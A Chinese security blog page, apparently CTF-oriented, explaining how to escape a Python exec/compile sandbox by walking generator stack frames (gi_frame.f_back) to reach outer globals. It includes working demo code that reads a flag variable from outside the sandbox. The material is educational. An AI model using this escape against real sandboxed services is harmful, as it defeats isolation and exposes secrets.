@@ -1,0 +1,715 @@
+
+<!DOCTYPE html><html lang="zh-CN">
+
+<head>
+  <meta charset="utf-8">
+  <meta name="hexo-theme" content="https://github.com/xaoxuu/hexo-theme-stellar/tree/1.28.1" theme-name="Stellar" theme-version="1.28.1">
+  
+  <meta name="generator" content="Hexo 7.2.0">
+  <meta http-equiv='x-dns-prefetch-control' content='on' />
+  
+  <meta name="renderer" content="webkit">
+  <meta name="force-rendering" content="webkit">
+  <meta http-equiv="X-UA-Compatible" content="IE=Edge,chrome=1">
+  <meta name="HandheldFriendly" content="True" >
+  <meta name="apple-mobile-web-app-capable" content="yes">
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="theme-color" media="(prefers-color-scheme: light)" content="#f9fafb">
+  <meta name="theme-color" media="(prefers-color-scheme: dark)" content="#000">
+  <meta name="referrer" content="no-referrer">
+  <title>python利用帧栈沙箱逃逸 - ( ゜- ゜)つロ</title>
+
+  
+    <meta name="description" content="python利用帧栈沙箱逃逸基础知识生成器 在Python中，这种一边循环一边计算的机制，称为生成器：generator。  generator的函数，在每次调用next()的时候执行，遇到yield语句返回，再次执行时从上次返回的yield语句处继续执行。 举个简单栗子： 123456789def f():    a&#x3D;1    while True:        yield a">
+<meta property="og:type" content="article">
+<meta property="og:title" content="python利用帧栈沙箱逃逸">
+<meta property="og:url" content="http://example.com/2024/06/07/python%E5%B8%A7%E6%A0%88%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/index.html">
+<meta property="og:site_name" content="( ゜- ゜)つロ">
+<meta property="og:description" content="python利用帧栈沙箱逃逸基础知识生成器 在Python中，这种一边循环一边计算的机制，称为生成器：generator。  generator的函数，在每次调用next()的时候执行，遇到yield语句返回，再次执行时从上次返回的yield语句处继续执行。 举个简单栗子： 123456789def f():    a&#x3D;1    while True:        yield a">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://img2023.cnblogs.com/blog/3239321/202405/3239321-20240504160342992-1102112445.png">
+<meta property="og:image" content="https://img2023.cnblogs.com/blog/3239321/202405/3239321-20240504161705366-1251435930.png">
+<meta property="og:image" content="https://img2023.cnblogs.com/blog/3239321/202405/3239321-20240504175805686-2047619731.png">
+<meta property="og:image" content="https://img2023.cnblogs.com/blog/3239321/202405/3239321-20240512160435697-202762695.png">
+<meta property="og:image" content="https://img2023.cnblogs.com/blog/3239321/202405/3239321-20240512160535185-674885589.png">
+<meta property="og:image" content="https://img2023.cnblogs.com/blog/3239321/202405/3239321-20240512160522065-916837349.png">
+<meta property="article:published_time" content="2024-06-07T03:42:27.807Z">
+<meta property="article:modified_time" content="2024-06-07T03:51:56.890Z">
+<meta property="article:author" content="Mi4t">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://img2023.cnblogs.com/blog/3239321/202405/3239321-20240504160342992-1102112445.png">
+  
+  
+  
+  
+
+  <!-- feed -->
+  
+
+  <link rel="stylesheet" href="/css/main.css?v=1.28.1">
+
+  
+    <link rel="shortcut icon" href="https://img2023.cnblogs.com/blog/3239321/202405/3239321-20240510204905362-230720887.png">
+  
+
+  
+
+  <link rel="stylesheet" href="https://cdn.staticfile.org/lxgw-wenkai-screen-webfont/1.6.0/lxgwwenkaiscreen.css" media="print" onload="this.media='all'">
+</head>
+<body><script src="https://cdn.staticfile.org/jquery/3.6.3/jquery.min.js"></script> 
+            <script async data-pjax src="/js/services/txmap.js"></script>
+
+<div class="l_body s:aa content tech" id="start" layout="post" ><aside class="l_left"><div class="leftbar-container">
+
+
+<header class="header"><div class="logo-wrap"><a class="avatar" href="/about/"><div class="bg" style="opacity:0;background-image:url(https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/avatar/round/rainbow64@3x.webp);"></div><img no-lazy class="avatar" src="https://img2023.cnblogs.com/blog/3239321/202405/3239321-20240510204120647-1453610015.png" onerror="javascript:this.classList.add('error');this.src='https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/image/2659360.svg';"></a><a class="title" href="/"><div class="main" ff="title">( ゜- ゜)つロ</div><div class="sub normal cap">time tries truth</div><div class="sub hover cap" style="opacity:0">一个非常非常菜的web手</div></a></div></header>
+
+<div class="nav-area">
+<div class="search-wrapper" id="search-wrapper"><form class="search-form"><a class="search-button" onclick="document.getElementById(&quot;search-input&quot;).focus();"><svg t="1705074644177" viewBox="0 0 1025 1024" version="1.1" xmlns="http://www.w3.org/2000/svg" p-id="1560" width="200" height="200"><path d="M1008.839137 935.96571L792.364903 719.491476a56.783488 56.783488 0 0 0-80.152866 0 358.53545 358.53545 0 1 1 100.857314-335.166073 362.840335 362.840335 0 0 1-3.689902 170.145468 51.248635 51.248635 0 1 0 99.217358 26.444296 462.057693 462.057693 0 1 0-158.255785 242.303546l185.930047 185.725053a51.248635 51.248635 0 0 0 72.568068 0 51.248635 51.248635 0 0 0 0-72.978056z" p-id="1561"></path><path d="M616.479587 615.969233a50.428657 50.428657 0 0 0-61.498362-5.534852 174.655348 174.655348 0 0 1-177.525271 3.484907 49.403684 49.403684 0 0 0-58.833433 6.76482l-3.074918 2.869923a49.403684 49.403684 0 0 0 8.609771 78.10292 277.767601 277.767601 0 0 0 286.992355-5.739847 49.403684 49.403684 0 0 0 8.404776-76.667958z" p-id="1562"></path></svg></a><input type="text" class="search-input" id="search-input" placeholder="站内搜索"></form><div id="search-result"></div><div class="search-no-result">没有找到内容！</div></div>
+
+
+<nav class="menu dis-select"><a class="nav-item active" title="博客" href="/" style="color:#1BCDFC"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="currentColor" fill-rule="evenodd" d="M5.879 2.879C5 3.757 5 5.172 5 8v8c0 2.828 0 4.243.879 5.121C6.757 22 8.172 22 11 22h2c2.828 0 4.243 0 5.121-.879C19 20.243 19 18.828 19 16V8c0-2.828 0-4.243-.879-5.121C17.243 2 15.828 2 13 2h-2c-2.828 0-4.243 0-5.121.879M8.25 17a.75.75 0 0 1 .75-.75h3a.75.75 0 0 1 0 1.5H9a.75.75 0 0 1-.75-.75M9 12.25a.75.75 0 0 0 0 1.5h6a.75.75 0 0 0 0-1.5zM8.25 9A.75.75 0 0 1 9 8.25h6a.75.75 0 0 1 0 1.5H9A.75.75 0 0 1 8.25 9" clip-rule="evenodd"/><path fill="currentColor" d="M5.235 4.058C5 4.941 5 6.177 5 8v8c0 1.823 0 3.058.235 3.942L5 19.924c-.975-.096-1.631-.313-2.121-.803C2 18.243 2 16.828 2 14v-4c0-2.829 0-4.243.879-5.121c.49-.49 1.146-.707 2.121-.803zm13.53 15.884C19 19.058 19 17.822 19 16V8c0-1.823 0-3.059-.235-3.942l.235.018c.975.096 1.631.313 2.121.803C22 5.757 22 7.17 22 9.999v4c0 2.83 0 4.243-.879 5.122c-.49.49-1.146.707-2.121.803z" opacity=".5"/></svg></a><a class="nav-item" title="日常" href="/daily/" style="color:#3DC550"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="currentColor" fill-rule="evenodd" d="M14.25 4.48v3.057c0 .111 0 .27.02.406a.936.936 0 0 0 .445.683a.96.96 0 0 0 .783.072c.13-.04.272-.108.378-.159L17 8.005l1.124.534c.106.05.248.119.378.16a.958.958 0 0 0 .783-.073a.936.936 0 0 0 .444-.683c.021-.136.021-.295.021-.406V3.031c.113-.005.224-.01.332-.013C21.154 2.98 22 3.86 22 4.933v11.21c0 1.112-.906 2.01-2.015 2.08c-.97.06-2.108.179-2.985.41c-1.082.286-1.99 1.068-3.373 1.436c-.626.167-1.324.257-1.627.323V5.174c.32-.079 1.382-.203 1.674-.371c.184-.107.377-.216.576-.323m5.478 8.338a.75.75 0 0 1-.546.91l-4 1a.75.75 0 0 1-.364-1.456l4-1a.75.75 0 0 1 .91.546" clip-rule="evenodd"/><path fill="currentColor" d="M18.25 3.151c-.62.073-1.23.18-1.75.336a8.2 8.2 0 0 0-.75.27v3.182l.75-.356l.008-.005a1.13 1.13 0 0 1 .492-.13c.047 0 .094.004.138.01c.175.029.315.1.354.12l.009.005l.749.356V3.647z"/><path fill="currentColor" d="M12 5.214c-.334-.064-1.057-.161-1.718-.339C8.938 4.515 8.05 3.765 7 3.487c-.887-.234-2.041-.352-3.018-.412C2.886 3.007 2 3.9 2 4.998v11.146c0 1.11.906 2.01 2.015 2.079c.97.06 2.108.179 2.985.41c.486.129 1.216.431 1.873.726c1.005.451 2.052.797 3.127 1.034z" opacity=".5"/><path fill="currentColor" d="M4.273 12.818a.75.75 0 0 1 .91-.545l4 1a.75.75 0 1 1-.365 1.455l-4-1a.75.75 0 0 1-.545-.91m.909-4.545a.75.75 0 1 0-.364 1.455l4 1a.75.75 0 0 0 .364-1.455z"/></svg></a><a class="nav-item" title="友链" href="/friends/" style="color:#F44336"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="currentColor" d="m13.629 20.472l-.542.916c-.483.816-1.69.816-2.174 0l-.542-.916c-.42-.71-.63-1.066-.968-1.262c-.338-.197-.763-.204-1.613-.219c-1.256-.021-2.043-.098-2.703-.372a5 5 0 0 1-2.706-2.706C2 14.995 2 13.83 2 11.5v-1c0-3.273 0-4.91.737-6.112a5 5 0 0 1 1.65-1.651C5.59 2 7.228 2 10.5 2h3c3.273 0 4.91 0 6.113.737a5 5 0 0 1 1.65 1.65C22 5.59 22 7.228 22 10.5v1c0 2.33 0 3.495-.38 4.413a5 5 0 0 1-2.707 2.706c-.66.274-1.447.35-2.703.372c-.85.015-1.275.022-1.613.219c-.338.196-.548.551-.968 1.262" opacity=".5"/><path fill="currentColor" d="M10.99 14.308c-1.327-.978-3.49-2.84-3.49-4.593c0-2.677 2.475-3.677 4.5-1.609c2.025-2.068 4.5-1.068 4.5 1.609c0 1.752-2.163 3.615-3.49 4.593c-.454.335-.681.502-1.01.502c-.329 0-.556-.167-1.01-.502"/></svg></a><a class="nav-item" title="关于" href="/about/" style="color:#FA6400"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="currentColor" d="M20 12a8 8 0 1 1-16 0a8 8 0 0 1 16 0" opacity=".5"/><path fill="currentColor" d="M17.712 5.453c1.047-.193 2.006-.259 2.797-.152c.77.103 1.536.393 1.956 1.064c.446.714.312 1.542-.012 2.258c-.33.728-.918 1.499-1.672 2.268c-1.516 1.547-3.836 3.226-6.597 4.697c-2.763 1.472-5.495 2.484-7.694 2.92c-1.095.217-2.098.299-2.923.201c-.8-.095-1.6-.383-2.032-1.075c-.47-.752-.296-1.63.07-2.379c.375-.768 1.032-1.586 1.872-2.403L4 12.416c0 .219.083.71.168 1.146c.045.23.09.444.123.596c-.652.666-1.098 1.263-1.339 1.756c-.277.567-.208.825-.145.925c.072.116.305.305.937.38c.609.073 1.44.018 2.455-.183c2.02-.4 4.613-1.351 7.28-2.772c2.667-1.42 4.85-3.015 6.23-4.423c.694-.707 1.15-1.334 1.377-1.836c.233-.515.167-.75.107-.844c-.07-.112-.289-.294-.883-.374c-.542-.072-1.272-.041-2.163.112L16.87 5.656c.338-.101.658-.17.842-.203"/></svg></a></nav>
+</div>
+<div class="widgets">
+
+
+<widget class="widget-wrapper post-list"><div class="widget-header dis-select"><span class="name">最近更新</span></div><div class="widget-body fs14"><a class="item title" href="/2024/06/07/python%E5%B8%A7%E6%A0%88%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/"><span class="title">python利用帧栈沙箱逃逸</span></a><a class="item title" href="/2024/06/07/Opcache-PHP/"><span class="title">PHP7/8 OPCACHE缓存文件导致的RCE</span></a></div></widget>
+</div>
+
+</div></aside><div class="l_main" id="main">
+
+
+
+
+
+<div class="article banner top">
+  <div class="content">
+    <div class="top bread-nav footnote"><div class="left"><div class="flex-row" id="breadcrumb"><a class="cap breadcrumb" href="/">主页</a>
+<span class="sep"></span><a class="cap breadcrumb" href="/">文章</a></div>
+<div class="flex-row" id="post-meta"><span class="text created">发布于：<time datetime="2024-06-07T03:42:27.807Z">2024-06-07</time></span><span class="sep updated"></span><span class="text updated">更新于：<time datetime="2024-06-07T03:51:56.890Z">2024-06-07</time></span></div></div></div>
+    
+  </div>
+  </div><article class="md-text content"><h1 id="python利用帧栈沙箱逃逸"><a href="#python利用帧栈沙箱逃逸" class="headerlink" title="python利用帧栈沙箱逃逸"></a>python利用帧栈沙箱逃逸</h1><h2 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h2><h3 id="生成器"><a href="#生成器" class="headerlink" title="生成器"></a>生成器</h3><blockquote>
+<p>在Python中，这种一边循环一边计算的机制，称为生成器：generator。</p>
+</blockquote>
+<p>generator的函数，在每次调用<code>next()</code>的时候执行，遇到<code>yield</code>语句返回，再次执行时从上次返回的<code>yield</code>语句处继续执行。</p>
+<p><strong>举个简单栗子：</strong></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">f</span>():</span><br><span class="line">    a=<span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">yield</span> a</span><br><span class="line">        a+=<span class="number">1</span></span><br><span class="line">f=f()</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">next</span>(f)) <span class="comment">#1</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">next</span>(f)) <span class="comment">#2</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">next</span>(f)) <span class="comment">#3</span></span><br></pre></td></tr></table></figure>
+
+<p>如果我们给a定义一个范围，a&lt;&#x3D;100 ，可以使用for语句一次性输出</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">f</span>():</span><br><span class="line">    a=<span class="number">1</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100</span>):</span><br><span class="line">        <span class="keyword">yield</span> a</span><br><span class="line">        a+=<span class="number">1</span></span><br><span class="line">f=f()</span><br><span class="line"><span class="keyword">for</span> value <span class="keyword">in</span> f:</span><br><span class="line">    <span class="built_in">print</span>(value)</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="生成器表达式"><a href="#生成器表达式" class="headerlink" title="生成器表达式"></a>生成器表达式</h3><p>generator和list做区别的是最外层的<code>()</code>，而list是<code>[]</code>。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">x=(i * i <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>))</span><br><span class="line"><span class="comment">#next(x)</span></span><br><span class="line"><span class="keyword">for</span> n <span class="keyword">in</span> x:</span><br><span class="line">    <span class="built_in">print</span>(n)</span><br></pre></td></tr></table></figure>
+
+<p>上面一堆听不太懂也没多大关系，只需要知道一点<code>generator</code>获取<code>yield</code>定义的值通过<code>next()</code>函数 or for循环（for循环的原理是生成器是特殊的迭代器）</p>
+<h3 id="生成器属性"><a href="#生成器属性" class="headerlink" title="生成器属性"></a>生成器属性</h3><ul>
+<li><code>gi_code</code>: 生成器对应的code对象。</li>
+<li><code>gi_frame</code>: 生成器对应的frame（栈帧）对象。</li>
+<li><code>gi_running</code>: 生成器函数是否在执行。生成器函数在yield以后、执行yield的下一行代码前处于frozen状态，此时这个属性的值为0。</li>
+<li><code>gi_yieldfrom</code>：如果生成器正在从另一个生成器中 yield 值，则为该生成器对象的引用；否则为 None。</li>
+<li><code>gi_frame.f_locals</code>：一个字典，包含生成器当前帧的本地变量。</li>
+</ul>
+<p><strong>着重看一下 gi_frame 属性</strong></p>
+<p><code>gi_frame</code> 是一个与生成器（generator）和协程（coroutine）相关的属性。它指向生成器或协程当前执行的帧对象（frame object），如果这个生成器或协程正在执行的话。帧对象表示代码执行的当前上下文，包含了局部变量、执行的字节码指令等信息。</p>
+<p>比如：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">my_generator</span>():</span><br><span class="line">    <span class="keyword">yield</span> <span class="number">1</span></span><br><span class="line">    <span class="keyword">yield</span> <span class="number">2</span></span><br><span class="line">    <span class="keyword">yield</span> <span class="number">3</span></span><br><span class="line"></span><br><span class="line">gen = my_generator()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取生成器的当前帧信息</span></span><br><span class="line">frame = gen.gi_frame</span><br><span class="line"></span><br><span class="line"><span class="comment"># 输出生成器的当前帧信息</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Local Variables:&quot;</span>, frame.f_locals)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Global Variables:&quot;</span>, frame.f_globals)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Code Object:&quot;</span>, frame.f_code)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Instruction Pointer:&quot;</span>, frame.f_lasti)</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="帧栈-stack-frame"><a href="#帧栈-stack-frame" class="headerlink" title="帧栈(stack frame)"></a>帧栈(stack frame)</h3><p>栈帧包含了以下几个重要的属性：</p>
+<ul>
+<li><code>f_locals</code>: 一个字典，包含了函数或方法的局部变量。键是变量名，值是变量的值。</li>
+<li><code>f_globals</code>: 一个字典，包含了函数或方法所在模块的全局变量。键是全局变量名，值是变量的值。</li>
+<li><code>f_code</code>: 一个代码对象（code object），包含了函数或方法的字节码指令、常量、变量名等信息。</li>
+<li><code>f_lasti</code>: 整数，表示最后执行的字节码指令的索引。</li>
+<li><code>f_back</code>: 指向上一级调用栈帧的引用，用于构建调用栈。</li>
+</ul>
+<p>每个栈帧都会保存当时的 py 字节码和记录自身上一层的栈帧 ！！！！！</p>
+<h2 id="利用帧栈沙箱逃逸"><a href="#利用帧栈沙箱逃逸" class="headerlink" title="利用帧栈沙箱逃逸"></a>利用帧栈沙箱逃逸</h2><p><strong>原理就是通过生成器的栈帧对象通过f_back（返回前一帧）从而逃逸出去获取globals全局符号表</strong></p>
+<p>栗子：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">s3cret=<span class="string">&quot;this is flag&quot;</span></span><br><span class="line"></span><br><span class="line">codes=<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">def waff():</span></span><br><span class="line"><span class="string">    def f():</span></span><br><span class="line"><span class="string">        yield g.gi_frame.f_back</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    g = f()  #生成器</span></span><br><span class="line"><span class="string">    frame = next(g) #获取到生成器的栈帧对象</span></span><br><span class="line"><span class="string">    # frame = [x for x in g][0] # 由于生成器也是迭代器，所以也可以获取到生成器的帧栈</span></span><br><span class="line"><span class="string">    b = frame.f_back.f_back.f_globals[&#x27;s3cret&#x27;] #返回并获取前一级栈帧的globals</span></span><br><span class="line"><span class="string">    return b</span></span><br><span class="line"><span class="string">b=waff()</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="built_in">locals</span>=&#123;&#125;</span><br><span class="line">code = <span class="built_in">compile</span>(codes, <span class="string">&quot;test&quot;</span>, <span class="string">&quot;exec&quot;</span>)</span><br><span class="line"><span class="built_in">exec</span>(code,<span class="built_in">locals</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">locals</span>[<span class="string">&quot;b&quot;</span>])</span><br></pre></td></tr></table></figure>
+
+
+
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">s3cret = <span class="string">&quot;this is flag&quot;</span></span><br><span class="line"></span><br><span class="line">codes = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">def waff():</span></span><br><span class="line"><span class="string">    def f():</span></span><br><span class="line"><span class="string">        yield g.gi_frame.f_back</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    g = f()  # 生成器</span></span><br><span class="line"><span class="string">    # frame = next(g) # 获取到生成器的栈帧对象</span></span><br><span class="line"><span class="string">    frame = [x for x in g][0]  # 由于生成器也是迭代器，所以也可以获取到生成器的帧栈</span></span><br><span class="line"><span class="string">    b = frame.f_back.f_back.f_globals[&#x27;s3cret&#x27;]  # 返回并获取前一级栈帧的globals</span></span><br><span class="line"><span class="string">    return b</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">b = waff()</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">locals_dict = &#123;<span class="string">&#x27;s3cret&#x27;</span>: s3cret&#125; <span class="comment"># 这里稍微注意一下f_globals中没有找到s3cret变量</span></span><br><span class="line">code = <span class="built_in">compile</span>(codes, <span class="string">&quot;test&quot;</span>, <span class="string">&quot;exec&quot;</span>)</span><br><span class="line"><span class="built_in">exec</span>(code, locals_dict)</span><br><span class="line"><span class="built_in">print</span>(locals_dict[<span class="string">&quot;b&quot;</span>])</span><br></pre></td></tr></table></figure>
+
+<p>代码说明：</p>
+<ul>
+<li>之前提到的<code>next</code>获取yield定义的值，这里获取的就是<code>g.gi_frame.f_back</code></li>
+<li>使用<code>g.gi_frame.f_back</code>的话，那么<code>g = f()</code>就必须为g，用的就是这个生成器对象的栈帧</li>
+<li><code>compile(codes, &quot;test&quot;, &quot;exec&quot;)</code>就是设置了名称为<code>test</code>的python沙箱环境</li>
+</ul>
+<p>理解一下逃逸的顺序：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">s3cret=<span class="string">&quot;this is flag&quot;</span></span><br><span class="line"></span><br><span class="line">codes=<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">def waff():</span></span><br><span class="line"><span class="string">    def f():</span></span><br><span class="line"><span class="string">        yield g.gi_frame.f_back</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    g = f()              #生成器</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    frame = next(g)     #获取到生成器的栈帧对象</span></span><br><span class="line"><span class="string">    print(frame)</span></span><br><span class="line"><span class="string">    print(frame.f_back)</span></span><br><span class="line"><span class="string">    print(frame.f_back.f_back)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">waff()</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="built_in">locals</span>=&#123;&#125;</span><br><span class="line">code = <span class="built_in">compile</span>(codes, <span class="string">&quot;test&quot;</span>, <span class="string">&quot;exec&quot;</span>)</span><br><span class="line"><span class="built_in">exec</span>(code,<span class="built_in">locals</span>)</span><br></pre></td></tr></table></figure>
+
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://img2023.cnblogs.com/blog/3239321/202405/3239321-20240504160342992-1102112445.png" alt="image-20240504160342172"></p>
+<p>即：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">f  -&gt; waff -&gt; &lt;module&gt;(test) -&gt; &lt;module&gt;(ex1.py)</span><br></pre></td></tr></table></figure>
+
+<p>成功逃逸</p>
+<p>获取到外部的栈帧，就可以用<code>f_globals</code>去获取沙箱外的全局变量了</p>
+<p>但是<code>yield g.gi_frame.f_back</code>并不能修改为<code>yield g.gi_frame</code></p>
+<p>这样获取到的栈帧经过<code>f_back</code>后获得的是<code>None</code></p>
+<p>要是再来一个<code>f_back</code>就会报错</p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://img2023.cnblogs.com/blog/3239321/202405/3239321-20240504161705366-1251435930.png" alt="image-20240504161704664"></p>
+<p><code>frame.f_back.f_back.f_back.f_back</code> 尝试访问的是 <code>waff</code> 函数的外部调用者的栈帧对象，但是在这个例子中，<code>waff</code> 是最外层函数，没有外部函数调用它</p>
+<p>再写一层就能理解了：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">s3cret=<span class="string">&quot;this is flag&quot;</span></span><br><span class="line"></span><br><span class="line">codes=<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">def xhw():</span></span><br><span class="line"><span class="string">    def waff():</span></span><br><span class="line"><span class="string">        def f():</span></span><br><span class="line"><span class="string">            yield g.gi_frame.f_back</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        g = f()              #生成器</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        frame = next(g)     #获取到生成器的栈帧对象</span></span><br><span class="line"><span class="string">        print(frame)</span></span><br><span class="line"><span class="string">        print(frame.f_back)</span></span><br><span class="line"><span class="string">        print(frame.f_back.f_back)</span></span><br><span class="line"><span class="string">        print(frame.f_back.f_back.f_back)</span></span><br><span class="line"><span class="string">        print(frame.f_back.f_back.f_back.f_back)</span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    waff()</span></span><br><span class="line"><span class="string">xhw()</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="built_in">locals</span>=&#123;&#125;</span><br><span class="line">code = <span class="built_in">compile</span>(codes, <span class="string">&quot;test&quot;</span>, <span class="string">&quot;exec&quot;</span>)</span><br><span class="line"><span class="built_in">exec</span>(code,<span class="built_in">locals</span>)</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="globals中的-builtins字段"><a href="#globals中的-builtins字段" class="headerlink" title="globals中的__builtins字段"></a>globals中的__builtins字段</h2><p><code>__builtins__</code> 模块是 Python 解释器启动时自动加载的，其中包含了一系列内置函数、异常和其他内置对象。<br>使用 dir(<code>__builtins__</code>) 来查看所有可用的内置函数和异常的列表</p>
